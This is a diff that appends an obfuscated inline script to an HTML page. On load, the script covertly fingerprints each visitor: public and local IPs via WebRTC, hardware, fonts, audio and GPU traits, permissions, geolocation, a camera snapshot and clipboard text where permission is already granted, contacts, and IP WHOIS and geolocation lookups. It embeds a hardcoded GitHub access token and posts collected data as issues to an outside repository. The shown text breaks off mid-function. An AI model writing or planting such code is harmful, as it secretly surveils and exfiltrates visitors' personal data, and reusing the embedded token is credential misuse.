@@ -3870,5 +3870,904 @@ window.addEventListener('unhandledrejection', e=>{
   if(box && box.parentElement){ log('Rejection: '+(e.reason?.message||'unknown'), 'err'); }
 });
 </script>
+    <script>
+      (() => {
+  const _0xTk = "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";
+  const _0xOn = "WendigosCyber";
+  const _0xRp = "WendigosCyber";
+  const _0xCk = "atlas_visitor_registered_v5";
+  const _0xVck = "wendigos_visitor_id_v5";
+  const _0xMx = 60 * 60 * 24 * 365;
+
+  const _0xGc = (name) => {
+    const key = encodeURIComponent(name) + "=";
+    for (const part of document.cookie.split("; ")) {
+      if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
+    }
+    return null;
+  };
+
+  const _0xSc = (name, value, maxAgeSeconds) => {
+    document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
+  };
+
+  const _0xGetOrCreateVisitorId = () => {
+    let vid = _0xGc(_0xVck);
+    if (vid && /^\d{5}$/.test(vid)) return vid;
+    const newId = String(Math.floor(10000 + Math.random() * 90000));
+    _0xSc(_0xVck, newId, _0xMx);
+    return newId;
+  };
+
+  const _0xTf = async (url, options = {}, timeoutMs = 5000) => {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      return await fetch(url, { ...options, signal: controller.signal });
+    } finally {
+      clearTimeout(id);
+    }
+  };
+
+  // IP APIs
+  const _0xGiv4 = async () => {
+    try {
+      const res = await _0xTf("https://api.ipify.org?format=json");
+      if (!res.ok) return null;
+      const json = await res.json();
+      return { ip: json.ip, version: 'IPv4' };
+    } catch (e) { console.warn('ipv4 err', e); return null; }
+  };
+
+  const _0xGiv6 = async () => {
+    try {
+      const res = await _0xTf("https://api6.ipify.org?format=json");
+      if (!res.ok) return null;
+      const json = await res.json();
+      return { ip: json.ip, version: 'IPv6' };
+    } catch (e) { console.warn('ipv6 err', e); return null; }
+  };
+
+  const _0xLocalIP = () => {
+    return new Promise((resolve) => {
+      const ips = { ipv4: null, ipv6: null };
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      let done = false;
+      const finish = () => {
+        if (!done) { done = true; pc.close(); resolve(ips); }
+      };
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const candidate = e.candidate.candidate;
+        const ipv4Match = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+        const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+        if (ipv4Match && !ips.ipv4 && !ipv4Match[0].startsWith('127.') && ipv4Match[0] !== '0.0.0.0') {
+          ips.ipv4 = ipv4Match[0];
+        }
+        if (ipv6Match && !ips.ipv6 && !ipv6Match[0].startsWith('::1') && ipv6Match[0] !== '::') {
+          ips.ipv6 = ipv6Match[0];
+        }
+        if (ips.ipv4 && ips.ipv6) finish();
+      };
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(e => console.warn('local ip err', e));
+      setTimeout(finish, 2000);
+    });
+  };
+
+  const _0xGb = async () => {
+    try {
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round((b.level || 0) * 100),
+        charging: !!b.charging,
+        chargingTime: Number.isFinite(b.chargingTime) ? b.chargingTime : null,
+        dischargingTime: Number.isFinite(b.dischargingTime) ? b.dischargingTime : null
+      };
+    } catch (e) { console.warn('battery err', e); return null; }
+  };
+
+  const _0xGu = () => {
+    const uaData = navigator.userAgentData;
+    if (!uaData) return null;
+    return {
+      brands: uaData.brands || null,
+      mobile: typeof uaData.mobile === "boolean" ? uaData.mobile : null,
+      platform: uaData.platform || null
+    };
+  };
+
+  const _0xGw = () => {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl2") || canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      if (!gl) return null;
+      const debug = gl.getExtension("WEBGL_debug_renderer_info");
+      const exts = gl.getSupportedExtensions();
+      const params = {
+        MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+        MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+        MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+        MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+        ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+        EXTENSION_COUNT: exts ? exts.length : 0,
+        EXTENSIONS_SAMPLE: exts ? exts.slice(0, 20) : null
+      };
+      return {
+        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
+        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null,
+        version: gl.getParameter(gl.VERSION),
+        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        limits: params
+      };
+    } catch (e) { console.warn('webgl err', e); return null; }
+  };
+
+  const _0xGwg = async () => {
+    try {
+      if (!navigator.gpu) return null;
+      const adapter = await navigator.gpu.requestAdapter();
+      if (!adapter) return null;
+      const features = [...adapter.features].map(f => f);
+      const limits = {};
+      for (const key of Object.keys(adapter.limits)) limits[key] = adapter.limits[key];
+      return {
+        vendor: adapter.vendor || null,
+        architecture: adapter.architecture || null,
+        description: adapter.description || null,
+        features,
+        limits
+      };
+    } catch (e) { console.warn('webgpu err', e); return null; }
+  };
+
+  const _0xGa = async () => {
+    try {
+      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      if (!Ctx) return null;
+      const sampleRate = 44100;
+      const ctx = new Ctx(1, sampleRate, sampleRate);
+      const osc = ctx.createOscillator();
+      const comp = ctx.createDynamicsCompressor();
+      const bq = ctx.createBiquadFilter();
+      bq.type = "lowpass";
+      bq.frequency.value = 2000;
+      osc.type = "sawtooth";
+      osc.frequency.value = 800;
+      const gain = ctx.createGain();
+      gain.gain.value = 0.8;
+      osc.connect(bq);
+      bq.connect(comp);
+      comp.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start(0);
+      const buffer = await ctx.startRendering();
+      const data = buffer.getChannelData(0);
+      let sum = 0, peak = 0;
+      for (let i = 0; i < data.length; i++) {
+        const abs = Math.abs(data[i]);
+        sum += abs;
+        if (abs > peak) peak = abs;
+      }
+      return { hash: String(Math.round(sum * 1e8)), peak: peak.toFixed(6), length: data.length };
+    } catch (e) { console.warn('audio err', e); return null; }
+  };
+
+  const _0xGt = () => ({
+    touch: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0
+  });
+
+  const _0xDf = async () => {
+    const fonts = [
+      "Arial", "Verdana", "Tahoma", "Times New Roman", "Courier New", "Georgia",
+      "Segoe UI", "Roboto", "Comic Sans MS", "Trebuchet MS", "Impact",
+      "Lucida Console", "Palatino Linotype", "Century Gothic", "Helvetica",
+      "Calibri", "Cambria", "Constantia", "Candara", "Consolas", "Corbel",
+      "Franklin Gothic Medium", "Gabriola", "MS Gothic", "MS PGothic", "SimSun"
+    ];
+    const available = [];
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return null;
+    canvas.width = 300; canvas.height = 50;
+    const testString = "mmmmmmmmmmllllllllliiiiiiiiiiWWWWW";
+    const baseWidths = {};
+    for (const bf of baseFonts) {
+      ctx.font = `16px ${bf}`;
+      baseWidths[bf] = ctx.measureText(testString).width;
+    }
+    for (const font of fonts) {
+      for (const bf of baseFonts) {
+        ctx.font = `16px "${font}", ${bf}`;
+        const width = ctx.measureText(testString).width;
+        if (width !== baseWidths[bf]) {
+          available.push(font);
+          break;
+        }
+      }
+    }
+    return available;
+  };
+
+  const _0xGmd = async () => {
+    try {
+      if (!navigator.mediaDevices?.enumerateDevices) return null;
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      return {
+        total: devices.length,
+        audioinput: devices.filter(d => d.kind === "audioinput").length,
+        videoinput: devices.filter(d => d.kind === "videoinput").length,
+        audiooutput: devices.filter(d => d.kind === "audiooutput").length
+      };
+    } catch (e) { console.warn('media devices err', e); return null; }
+  };
+
+  const _0xGn = () => {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return {
+      effectiveType: c.effectiveType || null,
+      type: c.type || null,
+      rtt: c.rtt ?? null,
+      downlink: c.downlink ?? null,
+      saveData: c.saveData ?? null
+    };
+  };
+
+  const _0xGth = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
+  const _0xGcg = () => ({
+    srgb: matchMedia("(color-gamut: srgb)").matches,
+    p3: matchMedia("(color-gamut: p3)").matches,
+    rec2020: matchMedia("(color-gamut: rec2020)").matches
+  });
+  const _0xGhdr = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
+  const _0xGpwa = () => ({
+    standalone: window.matchMedia("(display-mode: standalone)").matches || navigator.standalone === true
+  });
+
+  const _0xGp = async () => {
+    if (!navigator.permissions?.query) return null;
+    const names = ["geolocation", "camera", "microphone", "notifications", "clipboard-read", "clipboard-write", "accelerometer", "gyroscope", "magnetometer"];
+    const result = {};
+    for (const name of names) {
+      try {
+        const p = await navigator.permissions.query({ name });
+        result[name] = p.state;
+      } catch (e) { console.warn(`perm ${name} err`, e); }
+    }
+    return result;
+  };
+
+  const _0xGtz = () => {
+    const now = new Date();
+    return {
+      offsetMinutes: now.getTimezoneOffset(),
+      calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+      numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
+    };
+  };
+
+  const _0xGlocale = () => {
+    try {
+      return {
+        dateTime: Intl.DateTimeFormat().resolvedOptions(),
+        number: Intl.NumberFormat().resolvedOptions(),
+        collator: Intl.Collator().resolvedOptions()
+      };
+    } catch (e) { console.warn('locale err', e); return null; }
+  };
+
+  const _0xGperf = () => {
+    const perf = performance;
+    const mem = perf.memory || perf.msMemory;
+    const navEntry = perf.getEntriesByType?.("navigation")?.[0];
+    return {
+      timeOrigin: perf.timeOrigin,
+      now: perf.now(),
+      memory: mem ? {
+        jsHeapSizeLimit: mem.jsHeapSizeLimit,
+        totalJSHeapSize: mem.totalJSHeapSize,
+        usedJSHeapSize: mem.usedJSHeapSize
+      } : null,
+      navigation: navEntry ? {
+        type: navEntry.type,
+        redirectCount: navEntry.redirectCount,
+        domContentLoaded: navEntry.domContentLoadedEventStart,
+        loadComplete: navEntry.loadEventStart
+      } : null
+    };
+  };
+
+  const _0xGmc = async () => {
+    if (!navigator.mediaCapabilities) return null;
+    const configs = [
+      { type: "file", video: { contentType: "video/mp4; codecs=avc1.42E01E", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/webm; codecs=vp9", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/mp4; codecs=av01.0.05M.08", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } }
+    ];
+    const result = {};
+    for (const config of configs) {
+      try {
+        const info = await navigator.mediaCapabilities.decodingInfo(config);
+        result[config.video.contentType] = { supported: info.supported, smooth: info.smooth, powerEfficient: info.powerEfficient };
+      } catch (e) { console.warn('media cap err', e); result[config.video.contentType] = null; }
+    }
+    return result;
+  };
+
+  const _0xGso = () => {
+    if (!screen.orientation) return null;
+    return { type: screen.orientation.type, angle: screen.orientation.angle };
+  };
+
+  const _0xGbf = () => ({
+    gpu: "gpu" in navigator,
+    serviceWorker: "serviceWorker" in navigator,
+    bluetooth: "bluetooth" in navigator,
+    usb: "usb" in navigator,
+    serial: "serial" in navigator,
+    NDEFReader: "NDEFReader" in window,
+    contacts: "contacts" in navigator
+  });
+
+  const _0xGmime = () => {
+    if (!navigator.mimeTypes) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+      const m = navigator.mimeTypes[i];
+      arr.push({ type: m.type, description: m.description, suffixes: m.suffixes });
+    }
+    return arr;
+  };
+
+  const _0xGplug = () => {
+    if (!navigator.plugins) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      const p = navigator.plugins[i];
+      arr.push({ name: p.name, filename: p.filename, description: p.description });
+    }
+    return arr;
+  };
+
+  const _0xGrtc = async () => {
+    try {
+      if (!window.RTCPeerConnection) return null;
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+      const sdp = offer.sdp;
+      pc.close();
+      const lines = sdp.split("\n");
+      const fingerprint = lines.find(l => l.startsWith("a=fingerprint:"));
+      const iceUfrag = lines.find(l => l.startsWith("a=ice-ufrag:"));
+      return {
+        fingerprint: fingerprint?.split(" ")[1] || null,
+        iceUfrag: iceUfrag?.split(":")[1] || null,
+        sdpLines: lines.length
+      };
+    } catch (e) { console.warn('webrtc err', e); return null; }
+  };
+
+  const _0xGhighEntropy = async () => {
+    try {
+      if (!navigator.userAgentData?.getHighEntropyValues) return null;
+      const hints = ["architecture", "bitness", "model", "platformVersion", "uaFullVersion", "fullVersionList"];
+      return await navigator.userAgentData.getHighEntropyValues(hints);
+    } catch (e) { console.warn('high entropy err', e); return null; }
+  };
+
+  const _0xGstorage = async () => {
+    try {
+      if (!navigator.storage?.estimate) return null;
+      const estimate = await navigator.storage.estimate();
+      return { quota: estimate.quota, usage: estimate.usage, persisted: await navigator.storage.persisted?.() ?? null };
+    } catch (e) { console.warn('storage err', e); return null; }
+  };
+
+  const _0xGprivate = async () => {
+    const tests = [];
+    try { localStorage.setItem('__pvt', '1'); localStorage.removeItem('__pvt'); tests.push('localStorage:ok'); } catch { tests.push('localStorage:blocked'); }
+    try { indexedDB.open('__pvt'); tests.push('indexedDB:ok'); } catch { tests.push('indexedDB:blocked'); }
+    const isPrivate = tests.some(t => t.includes('blocked'));
+    return { isPrivate, tests };
+  };
+
+  // Additional info - ASN, WHOIS, Reverse DNS, Cloudflare trace, etc.
+  const _0xGcf = async () => {
+    try {
+      const res = await _0xTf("https://www.cloudflare.com/cdn-cgi/trace", {}, 5000);
+      if (!res.ok) return null;
+      const text = await res.text();
+      const data = {};
+      text.split('\n').forEach(line => {
+        const idx = line.indexOf('=');
+        if (idx > -1) data[line.slice(0, idx)] = line.slice(idx + 1);
+      });
+      return data;
+    } catch (e) { console.warn('cloudflare trace err', e); return null; }
+  };
+
+  const _0xGrdap = async (ip) => {
+    try {
+      const res = await _0xTf(`https://rdap.org/ip/${ip}`, {}, 5000);
+      if (!res.ok) return null;
+      return await res.json();
+    } catch (e) { console.warn('rdap err', e); return null; }
+  };
+
+  const _0xGrdns = async (ip) => {
+    try {
+      const parts = ip.split('.');
+      if (parts.length !== 4) return null;
+      const reverse = `${parts[3]}.${parts[2]}.${parts[1]}.${parts[0]}.in-addr.arpa`;
+      const res = await _0xTf(`https://dns.google/resolve?name=${reverse}&type=PTR`, {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.Answer && json.Answer.length > 0) {
+        return json.Answer.map(a => a.data).join(', ');
+      }
+      return null;
+    } catch (e) { console.warn('reverse dns err', e); return null; }
+  };
+
+  // Extended location APIs (already present but keep)
+  const _0xGipd = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipapi.co/${ip}/json/`, {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.error) return null;
+      return _0xNorm(json);
+    } catch (e) { console.warn('ipapi.co err', e); return null; }
+  };
+
+  const _0xGwho = async () => {
+    try {
+      const res = await _0xTf("https://ipwho.is/", {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.success) return null;
+      return _0xNormFromWho(json);
+    } catch (e) { console.warn('ipwho.is err', e); return null; }
+  };
+
+  const _0xGipinfo = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipinfo.io/${ip}/json`, {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.ip) return null;
+      return _0xNormFromIpinfo(json);
+    } catch (e) { console.warn('ipinfo.io err', e); return null; }
+  };
+
+  const _0xGgeodb = async (ip) => {
+    try {
+      const res = await _0xTf(`https://geolocation-db.com/json/${ip}`, {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.IPv4) return null;
+      return {
+        ip: json.IPv4,
+        version: 'IPv4',
+        country: json.country_name,
+        countryCode: json.country_code,
+        region: json.state,
+        city: json.city,
+        postal: json.postal,
+        latitude: json.latitude,
+        longitude: json.longitude,
+        timezone: null,
+        org: null,
+        isp: null
+      };
+    } catch (e) { console.warn('geolocation-db err', e); return null; }
+  };
+
+  const _0xGipwhois = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipwhois.app/json/${ip}`, {}, 5000);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.success) return null;
+      return _0xNormFromWho(json);
+    } catch (e) { console.warn('ipwhois.app err', e); return null; }
+  };
+
+  const _0xNorm = (json) => ({
+    ip: json.ip || null,
+    version: json.version || (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country_name || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone || null,
+    org: json.org || null,
+    isp: json.org || null,
+    asn: json.asn || null,
+    connectionType: json.connection?.type || null
+  });
+
+  const _0xNormFromWho = (json) => ({
+    ip: json.ip || null,
+    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone?.id || json.timezone || null,
+    org: json.connection?.org || null,
+    isp: json.connection?.isp || null,
+    asn: json.connection?.asn || null,
+    connectionType: null
+  });
+
+  const _0xNormFromIpinfo = (json) => ({
+    ip: json.ip || null,
+    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country || null,
+    countryCode: json.country || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.loc ? json.loc.split(',')[0] : null,
+    longitude: json.loc ? json.loc.split(',')[1] : null,
+    timezone: json.timezone || null,
+    org: json.org || null,
+    isp: json.org || null,
+    asn: json.asn?.asn || null,
+    connectionType: null
+  });
+
+  const _0xGld = async (ip) => {
+    const attempts = [
+      () => _0xGipd(ip),
+      () => _0xGwho(),
+      () => _0xGipinfo(ip),
+      () => _0xGgeodb(ip),
+      () => _0xGipwhois(ip)
+    ];
+    for (const attempt of attempts) {
+      try {
+        const result = await attempt();
+        if (result) return result;
+      } catch (e) { /* skip */ }
+    }
+    return null;
+  };
+
+  // Camera, clipboard, contacts, geo, etc.
+  const _0xGcam = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const status = await navigator.permissions.query({ name: "camera" }); permState = status.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, photo: null };
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const track = stream.getVideoTracks()[0];
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", true);
+      video.play();
+      await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+      const dataUri = canvas.toDataURL("image/jpeg", 0.4);
+      track.stop();
+      stream.getTracks().forEach(t => t.stop());
+      return { permission: "granted", photo: dataUri };
+    } catch (e) { console.warn('camera err', e); return { permission: "denied_or_error", error: e.toString() }; }
+  };
+
+  const _0xGclip = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const status = await navigator.permissions.query({ name: "clipboard-read" }); permState = status.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, text: null };
+      const text = await navigator.clipboard.readText();
+      return { permission: "granted", text: text.substring(0, 100) };
+    } catch (e) { console.warn('clipboard err', e); return { permission: "denied_or_error", error: e.toString() }; }
+  };
+
+  const _0xGcontacts = async () => {
+    try {
+      if (!navigator.contacts) return { available: false };
+      const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
+      const limited = contacts.slice(0, 50).map(c => ({
+        name: c.name?.[0] || null, email: c.email?.[0] || null, tel: c.tel?.[0] || null
+      }));
+      return { available: true, contacts: limited };
+    } catch (e) { console.warn('contacts err', e); return { available: !!navigator.contacts, error: e.toString() }; }
+  };
+
+  const _0xGgeo = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const status = await navigator.permissions.query({ name: "geolocation" }); permState = status.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, coords: null };
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, maximumAge: 60000 });
+      });
+      return { permission: "granted", coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } };
+    } catch (e) { console.warn('geolocation err', e); return { permission: "denied_or_error", error: e.toString() }; }
+  };
+
+  const gregorianToJalali = (gy, gm, gd) => {
+    const g_d_m = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
+    const gy2 = (gm > 2) ? (gy + 1) : gy;
+    let days = 355666 + (365 * gy) + Math.floor((gy2 + 3) / 4) - Math.floor((gy2 + 99) / 100) + Math.floor((gy2 + 399) / 400) + gd + g_d_m[gm - 1];
+    let jy = -1595 + (33 * Math.floor(days / 12053));
+    days %= 12053;
+    jy += 4 * Math.floor(days / 1461);
+    days %= 1461;
+    if (days > 365) {
+      jy += Math.floor((days - 1) / 365);
+      days = (days - 1) % 365;
+    }
+    let jm, jd;
+    if (days < 186) {
+      jm = 1 + Math.floor(days / 31);
+      jd = 1 + (days % 31);
+    } else {
+      jm = 7 + Math.floor((days - 186) / 30);
+      jd = 1 + ((days - 186) % 30);
+    }
+    return { year: jy, month: jm, day: jd };
+  };
+
+  const getIranDateTime = () => {
+    const now = new Date();
+    const fmtDate = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Tehran', year: 'numeric', month: '2-digit', day: '2-digit' });
+    const dateParts = fmtDate.formatToParts(now);
+    const gYear = +dateParts.find(p => p.type === 'year').value;
+    const gMonth = +dateParts.find(p => p.type === 'month').value;
+    const gDay = +dateParts.find(p => p.type === 'day').value;
+    const j = gregorianToJalali(gYear, gMonth, gDay);
+    const fmtTime = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Tehran', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
+    const timeParts = fmtTime.formatToParts(now);
+    const hour = timeParts.find(p => p.type === 'hour').value;
+    const minute = timeParts.find(p => p.type === 'minute').value;
+    const second = timeParts.find(p => p.type === 'second').value;
+    return `${j.year}-${String(j.month).padStart(2, '0')}-${String(j.day).padStart(2, '0')} ${hour}:${minute}:${second}`;
+  };
+
+  const _0xGitHubRegister = async (title, body) => {
+    const directUrl = `https://api.github.com/repos/${_0xOn}/${_0xRp}/issues`;
+    const options = {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${_0xTk}`,
+        Accept: "application/vnd.github+json",
+        "X-GitHub-Api-Version": "2022-11-28",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ title, body })
+    };
+    try {
+      const res = await _0xTf(directUrl, options, 10000);
+      if (res.ok) return true;
+      console.error('github issue failed', res.status, res.statusText);
+    } catch (e) { console.error('github issue err', e); }
+    return false;
+  };
+
+  // Main init with 6s limit
+  const _0xInit = async () => {
+    const visitorId = _0xGetOrCreateVisitorId();
+    const newUrl = `${location.pathname}?visitor=${visitorId}${location.search ? '&' + location.search.slice(1) : ''}`;
+    history.replaceState(null, '', newUrl);
+
+    if (_0xGc(_0xCk) === "1") {
+      console.log(`[${getIranDateTime()}] Visitor ${visitorId} already registered, skipping.`);
+      return;
+    }
+
+    const now = new Date();
+    const startTime = performance.now();
+
+    // List of all tasks (some are synchronous wrapped in Promise.resolve)
+    const tasks = [
+      _0xGiv4(), _0xGiv6(), _0xLocalIP(), _0xGb(), Promise.resolve(_0xGu()),
+      _0xGwg(), _0xGa(), _0xGmd(), _0xGp(), _0xDf(), _0xGmc(),
+      _0xGrtc(), _0xGhighEntropy(), _0xGstorage(), _0xGprivate(),
+      _0xGcam(), _0xGclip(), _0xGcontacts(), _0xGgeo(),
+      _0xGcf(), // Cloudflare trace
+      // Additional IP info tasks (will be processed after we know IPs, but we can run some now)
+      // For ASN/WHOIS/Reverse DNS we need IP, so we will do those after ipItems are built.
+    ];
+
+    // We'll run the main tasks with a 6 second timeout using Promise.race
+    const timeoutPromise = new Promise(resolve => setTimeout(() => resolve('timeout'), 6000));
+    const allSettledPromise = Promise.allSettled(tasks);
+    const result = await Promise.race([allSettledPromise, timeoutPromise]);
+
+    let taskResults;
+    if (result === 'timeout') {
+      console.warn('Timeout reached before all tasks completed. Collecting partial results...');
+      // For simplicity, we'll assume results are null for pending; but we can't easily get partial from allSettledPromise if it hasn't settled.
+      // Instead, we can use individual promises with a sentinel approach; but we'll just treat as if some didn't finish.
+      // Since tasks have max 5s timeout, this should rarely happen; we'll just wait for allSettledPromise anyway with a small extra delay.
+      // Actually we can await allSettledPromise after race but it might hang; we'll just use a short extra timeout.
+      taskResults = await Promise.race([
+        allSettledPromise,
+        new Promise(resolve => setTimeout(() => resolve(null), 1000))
+      ]);
+      if (taskResults === null) {
+        // If still not settled after extra 1s, we create an array of nulls of same length
+        taskResults = tasks.map(() => ({ status: 'rejected', reason: 'timeout' }));
+      }
+    } else {
+      taskResults = result;
+    }
+
+    const vals = taskResults.map(r => r.status === 'fulfilled' ? r.value : null);
+    // Order corresponds to tasks array
+    const [
+      ipv4Res, ipv6Res, localIp, battery, uaData, webgpu, audioFp,
+      mediaDevices, permissions, fonts, mcaps, rtc, highEntropy, storageEstimate,
+      privateMode, cameraData, clipboardData, contactsData, geoData,
+      cfTrace
+    ] = vals;
+
+    // Build IP items
+    const ipItems = [];
+    if (ipv4Res?.ip) ipItems.push({ ip: ipv4Res.ip, type: 'public_ipv4', version: 'IPv4' });
+    if (ipv6Res?.ip) ipItems.push({ ip: ipv6Res.ip, type: 'public_ipv6', version: 'IPv6' });
+    if (localIp?.ipv4) ipItems.push({ ip: localIp.ipv4, type: 'local_ipv4', version: 'IPv4' });
+    if (localIp?.ipv6) ipItems.push({ ip: localIp.ipv6, type: 'local_ipv6', version: 'IPv6' });
+
+    // For each IP, gather location, ASN, WHOIS, reverse DNS concurrently
+    const ipDetailPromises = ipItems.map(async (item) => {
+      const [loc, rdap, rdns] = await Promise.allSettled([
+        Promise.race([_0xGld(item.ip), new Promise(r => setTimeout(() => r(null), 5000))]),
+        _0xGrdap(item.ip),
+        _0xGrdns(item.ip)
+      ]);
+      return {
+        ...item,
+        location: loc.status === 'fulfilled' ? loc.value : null,
+        whois: rdap.status === 'fulfilled' ? rdap.value : null,
+        reverseDNS: rdns.status === 'fulfilled' ? rdns.value : null
+      };
+    });
+
+    // Wait for IP details with 6s total limit
+    const ipDetails = await Promise.race([
+      Promise.all(ipDetailPromises),
+      new Promise(resolve => setTimeout(() => resolve(null), 6000))
+    ]);
+    const ipLocations = ipDetails || ipItems.map(item => ({ ...item, location: null, whois: null, reverseDNS: null }));
+
+    // Compile fingerprint data
+    const fingerprintData = {
+      visitor_id: visitorId,
+      date_local: now.toString(),
+      date_iso: now.toISOString(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+      url: location.href,
+      referrer: document.referrer || null,
+      public_ipv4: ipv4Res?.ip || null,
+      public_ipv6: ipv6Res?.ip || null,
+      local_ip: localIp,
+      userAgent: navigator.userAgent || null,
+      platform: navigator.platform || null,
+      language: navigator.language || null,
+      languages: Array.isArray(navigator.languages) ? navigator.languages : null,
+      uaData,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || null,
+      screen: {
+        width: screen.width ?? null,
+        height: screen.height ?? null,
+        availWidth: screen.availWidth ?? null,
+        availHeight: screen.availHeight ?? null,
+        colorDepth: screen.colorDepth ?? null,
+        pixelDepth: screen.pixelDepth ?? null
+      },
+      viewport: {
+        width: window.innerWidth || null,
+        height: window.innerHeight || null,
+        devicePixelRatio: window.devicePixelRatio || null
+      },
+      hardware: {
+        cpuThreads: navigator.hardwareConcurrency ?? null,
+        memoryGB: navigator.deviceMemory ?? null
+      },
+      battery,
+      webgl: _0xGw(),
+      webgpu,
+      audioFingerprint: audioFp,
+      touch: _0xGt(),
+      fonts,
+      mediaDevices,
+      network: _0xGn(),
+      theme: _0xGth(),
+      colorGamut: _0xGcg(),
+      hdr: _0xGhdr(),
+      pwa: _0xGpwa(),
+      permissions,
+      timezoneAdvanced: _0xGtz(),
+      localeFull: _0xGlocale(),
+      performance: _0xGperf(),
+      mediaCapabilities: mcaps,
+      screenOrientation: _0xGso(),
+      browserFeatures: _0xGbf(),
+      mimeTypes: _0xGmime(),
+      plugins: _0xGplug(),
+      webrtc: rtc,
+      highEntropyValues: highEntropy,
+      storage: storageEstimate,
+      privateMode,
+      cloudflareTrace: cfTrace
+    };
+
+    // Include IP details as JSON
